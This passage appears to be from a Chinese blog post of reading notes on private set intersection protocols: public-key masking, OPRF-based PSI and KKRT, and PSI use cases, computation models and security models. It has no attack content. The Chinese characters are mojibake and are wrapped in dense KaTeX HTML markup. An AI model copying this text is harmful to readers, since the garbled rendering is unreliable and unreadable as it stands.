class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span></span></span> å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><msup><mo stretchy="false">)</mo><mi>d</mi></msup></mrow><annotation encoding="application/x-tex">H(y_i)^d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span></span></span> æ±‚äº¤ã€‚Receiverä¸èƒ½ç›´æ¥å‘é€<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">H(x_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>ï¼Œå› æ­¤å…ˆå¼•å…¥æ©ç ï¼Œåœ¨å®Œæˆç›®æ ‡è¿ç®—åæ¶ˆé™¤æ©ç ã€‚</p><hr><p><img src="/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/image-20220717174455431.png" alt></p><hr><p>æ•ˆç‡ï¼šä¸­è®¡ç®—é‡ã€ä½é€šä¿¡é‡ï¼ˆæ¥æ”¶æ–¹çš„è®¡ç®—é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰ª</mo></mrow><annotation encoding="application/x-tex">\ll</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">â‰ª</span></span></span></span> å‘é€æ–¹è®¡ç®—é‡â€”â€”è§£å¯†æ“ä½œè€—æ—¶å¤§äºåŠ å¯†ï¼‰</p><p>å®‰å…¨ï¼šPKC-basedå®‰å…¨</p><h2 id="OPRF-based-PSI">OPRF-based PSI</h2><p><code>ä¼ªéšæœºå‡½æ•°ï¼ˆPseudorandom Function, PRF)</code>ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">âˆ€</mi><mi>k</mi><mo>âˆˆ</mo><mi mathvariant="script">K</mi><mo separator="true">,</mo><mi>m</mi><mo>âˆˆ</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><msup><mo stretchy="false">}</mo><mi>l</mi></msup></mrow><annotation encoding="application/x-tex">\forall k\in \mathcal{K},m\in \{0,1\}^l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord">âˆ€</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathcal" style="margin-right:0.01445em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">}</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span></span></span></span></span></span></span></span>ï¼Œæœ‰<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>k</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo><mo>â‰ˆ</mo><mi>U</mi><mi>n</mi><mi>i</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>m</mi><mtext>Â </mtext><mi>R</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">F(k,m)\approx Uniform\ Random</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal">ni</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mord mathnormal">m</span><span class="mspace">Â </span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">an</span><span class="mord mathnormal">d</span><span class="mord mathnormal">o</span><span class="mord mathnormal">m</span></span></span></span></p><p><code>ä¸ç»æ„ä¼ªéšæœºå‡½æ•°ï¼ˆOblivious PRFï¼ŒOPRFï¼‰</code>ï¼šç»™å®šä¸€ä¸ªæ¥è‡ªSenderï¼ˆBobï¼‰çš„å¯†é’¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> å’Œä¸€ä¸ªæ¥è‡ªReceiverï¼ˆAliceï¼‰çš„è¾“å…¥å…ƒç´  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>:</p><ul><li>ReceiverçŸ¥é“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>k</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(k,m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>ï¼Œä½†æ˜¯ä¸çŸ¥é“<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></li><li>SenderåªçŸ¥é“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>ï¼Œä½†ä¸çŸ¥é“è®¡ç®—ç»“æœå’Œè¾“å…¥æ•°æ®<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span></li></ul><p>æµç¨‹ç¤ºæ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/image-20220717193239879.png" alt></p><p>ä½¿ç”¨OPRFæ„é€ PSIï¼šå¯¹äºReceiveræ‹¥æœ‰çš„æ¯ä¸€ä¸ªæ•°æ® <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œéƒ½ä¼šäº§ç”Ÿä¸€ä¸ªå¯¹åº”çš„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">k_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œè€ŒSenderä¼šåˆ©ç”¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">k_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å¯¹å…¶æ¯ä¸€ä¸ªæ•°æ® <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">y_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> è®¡ç®— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><msub><mi>k</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(k_i,y_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>ï¼ŒReceiveræ¯”å¯¹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><msub><mi>k</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(k_i,x_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>  å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><msub><mi>k</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(k_i,y_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>ã€‚</p><hr><p><img src="/2022/07/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2022-%E9%9A%90%E7%A7%81%E6%B1%82%E4%BA%A4%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E5%8F%91%E5%B1%95%E5%8F%8A%E5%BA%94%E7%94%A8-%E7%AC%94%E8%AE%B0/image-20220717193441069.png" alt></p><hr><ul><li><p>Hidingï¼šåŸºäºOPRFï¼ˆé€šè¿‡ç§˜å¯†å‡½æ•°OPRFï¼Œä½¿å¾—Senderä¸çŸ¥é“Receiverçš„æ•°æ®ï¼Œè€ŒReceiverä¸çŸ¥é“ç§˜å¯†å‡½æ•°æ„é€ ï¼‰</p></li><li><p>Comparingï¼›æ¯”è¾ƒæ•°æ®ç»è¿‡ç§˜å¯†å‡½æ•°è¾“å‡ºçš„ç»“æœ</p></li><li><p>Efficiencyï¼šé«˜è®¡ç®—é‡ã€é«˜é€šä¿¡é‡ï¼ˆæœ¬åœ°æ¯”è¾ƒå’Œé€šä¿¡éƒ½æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>ï¼‰</p></li></ul><p>å¯é€šè¿‡<code>Cuckoo Hashing + OPRF</code>æ„é€ PSIï¼ˆKKRT PSI Protocolï¼‰ï¼Œå®ç°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> è§„æ¨¡çš„OPRFå’Œæœ¬åœ°æ¯”è¾ƒ</p><h1 id="PSIéœ€æ±‚ä¸åº”ç”¨">PSIéœ€æ±‚ä¸åº”ç”¨</h1><p>é™¤äº†å¸¸è§çš„ç™½/é»‘åå•ï¼Œæ’åº“ç­‰ï¼Œè¿˜æœ‰â€¦â€¦</p><h2 id="äº¤é›†ä½¿ç”¨">äº¤é›†ä½¿ç”¨</h2><p>åŠ¨æœºï¼š<strong>äº¤é›†å¯èƒ½å¹¶ä¸æ˜¯PSIå‚ä¸æ–¹é—´çš„å¸¸è¯†ï¼ˆäº¤é›†ä¸­çš„æ•°æ®å¯èƒ½å±äºå…¶ä»–äººï¼‰</strong>ã€‚æ¯”å¦‚ï¼šAliceä½¿ç”¨ç›¸åŒIDåœ¨é“¶è¡ŒAå’Œé“¶è¡ŒBéƒ½æ³¨å†Œäº†ä¿¡æ¯ï¼Œä½†æ˜¯é“¶è¡ŒAå’ŒBä¸èƒ½é€šè¿‡PSIæ³„éœ²Aliceçš„è”åˆæ˜æ–‡ä¿¡æ¯ã€‚</p><p>æŒ‘æˆ˜ï¼šäº¤é›†â€œå¯ç”¨ä¸å¯è§â€ï¼ˆPSIè¾“å‡ºä¸èƒ½æ˜¯ç›´æ¥çš„å…¨éƒ¨æ˜æ–‡ï¼‰</p><p>ç”¨æ³•ï¼š</p><ol><li>äº¤é›†ä¿å¯†ï¼ŒåŸºæ•°ï¼ˆcardinalityï¼‰åªèƒ½å‘è®¤è¯æ–¹æ³„éœ²</li><li>äº¤é›†ä¿å¯†ï¼Œä½†PSIçš„ç§˜å¯†è¾“å‡ºæ”¯æŒåç»­å®‰å…¨è®¡ç®—</li><li>äº¤é›†ä¿å¯†ï¼Œä½†æ˜¯<em>éœ€è¦ä¹ æƒ¯ï¼ˆbut still need to get usedï¼Œå•¥æ„æ€ï¼Œçœ‹ä¸æ‡‚ï¼‰</em>ï¼Œæ¯”å¦‚æ¥è”åˆå¹¿å‘Šè¥é”€</li></ol><h2 id="å¤šæ–¹PSI">å¤šæ–¹PSI</h2><ul><li><strong>å¸¸è§„å¤šæ–¹PSI</strong></li></ul><p>åŠ¨æœºï¼šéœ€è¦Nå‚ä¸æ–¹çš„äº¤é›†</p><p>æŒ‘æˆ˜ï¼šä»»æ„ä¸¤æ–¹é—´çš„äº¤é›†ä¸èƒ½è¢«æ³„éœ²</p><p>æ–¹æ³•ï¼š1ã€PHE+<code>å¤šé¡¹å¼è¡¨ç¤ºï¼ˆPolynomial representationï¼‰</code> ; 2ã€OPPRF</p><ul><li><strong>ç‰¹æ®Šå¤šæ–¹PSI</strong></li></ul><p>åŠ¨æœºï¼šéœ€è¦è®¡ç®—ä¸€äº›ä¸¤æ–¹é—´äº¤é›†ï¼Œäº¤é›†ç»“æœä¼šæ³„éœ²ç»™ç‰¹æ®Šçš„ä¸€äº›å‚ä¸æ–¹</p><p>æŒ‘æˆ˜ï¼šéœ€æ±‚éœ€è¦è§†æƒ…å†µè€Œå®šï¼Œéœ€è¦å®¢åˆ¶åŒ–çš„è§£å†³æ–¹æ¡ˆ</p><p>æ–¹æ³•ï¼šå¸¸è§„çš„PSIåè®®åŠ ä¸Šå®¢åˆ¶åŒ–</p><h2 id="è®¡ç®—æ¨¡å‹">è®¡ç®—æ¨¡å‹</h2><ul><li><p><strong>å•å‘æ¨¡å‹ï¼ˆOne-way Modelï¼‰</strong></p><p>åŠ¨æœºï¼šåª<strong>æœ‰ä¸€æ–¹åº”å½“çŸ¥é“äº¤é›†</strong>ã€‚æ¯”å¦‚ï¼Œå®¢æˆ·ç«¯å‘ä¸€ä¸ªæ–°çš„ç¤¾äº¤åª’ä½“æœåŠ¡æäº¤è”ç³»äººåˆ—è¡¨ï¼Œå®¢æˆ·ç«¯åº”è¯¥çŸ¥äº¤é›†ï¼Œè€ŒæœåŠ¡å™¨åº”å½“å¯¹å®¢æˆ·ç«¯çš„æ•°æ®ä¸€æ— æ‰€çŸ¥ï¼ˆæˆ–åªçŸ¥é“è¾“å…¥æ•°æ®å¤§å°ï¼‰ã€‚</p></li><li><p><strong>å…±æœ‰æ¨¡å‹ï¼ˆMutual Modelï¼‰</strong></p><p>åŠ¨æœºï¼šä¸¤æ–¹éƒ½åº”å½“çŸ¥é“äº¤é›†ã€‚æ¯”å¦‚ï¼Œå¯»æ‰¾ä¸¤ä¸ªé“¶è¡Œçš„å…±æœ‰å®¢æˆ·ã€‚</p></li><li><p><strong>å¤–åŒ…PSIï¼ˆOutsourced/Delegated/Server-Aided PSIï¼‰</strong></p><p>ä¸¤ä¸ªå®¢æˆ·ç«¯<strong>åœ¨ä¸å¯ä¿¡ç¬¬ä¸‰æ–¹çš„å¸®åŠ©ä¸‹</strong>åœ¨ä»–ä»¬çš„å¤–åŒ…æ•°æ®ä¸Šå®ŒæˆPSIè®¡ç®—ã€‚</p><p>åŠ¨æœºï¼šå‚ä¸æ–¹æ— æ³•å®ŒæˆPSIè®¡ç®—ï¼Œæ¯”å¦‚å‚ä¸æ–¹åªæ‹¥æœ‰èµ„æºå—é™çš„è®¾å¤‡</p><p>æŒ‘æˆ˜ï¼šç¬¬ä¸‰æ–¹åªå‚ä¸è®¡ç®—ï¼Œä½†ä¸åº”å½“è·å¾—æœ€ç»ˆç»“æœï¼ˆå³ä½¿æ˜¯cardinalityè¿™æ ·çš„æ•°æ®ï¼‰</p></li></ul><h2 id="å®‰å…¨æ¨¡å‹">å®‰å…¨æ¨¡å‹</h2><ul><li><p><strong>è¯šå®-å¥½å¥‡æ¨¡å‹å®‰å…¨PSIï¼ˆSemi-Honest Secure PSIï¼‰</strong></p><p>åŠ¨æœºï¼šç®€å•é«˜æ•ˆï¼ˆç›®å‰å¤§å¤šæ•°PSIåè®®éƒ½æ˜¯åœ¨è¯šå®-å¥½å¥‡çš„å‡è®¾ä¸‹å®ç°çš„ï¼‰</p><p>æŒ‘æˆ˜ï¼šå®‰å…¨å‡è®¾å¤ªå¼ºï¼Œåªè€ƒè™‘äº†è¢«åŠ¨ï¼ˆpassiveï¼‰æ•Œæ‰‹</p><p>æ–¹æ³•ï¼šåŸºäºDHã€OPRFç­‰çš„PSI</p></li><li><p><strong>æ¶æ„æ¨¡å‹å®‰å…¨PSIï¼ˆMalicious Secure PSI)</strong></p><p>åŠ¨æœºï¼šæ˜¯æ›´ç¬¦åˆç°å®çš„ï¼Œæ›´è¿›ä¸€æ­¥çš„å®‰å…¨å‡è®¾ï¼Œè€ƒè™‘æ¶æ„æ•Œæ‰‹</p><p>æŒ‘æˆ˜ï¼šæ›´å¤šçš„è®¡ç®—å’Œé€šä¿¡å¼€é”€</p><p>æ–¹æ³•ï¼šåŸºäºé¢å¤–èº«ä»½éªŒè¯çš„ PSI åè®®ç­‰</p></li></ul><h2 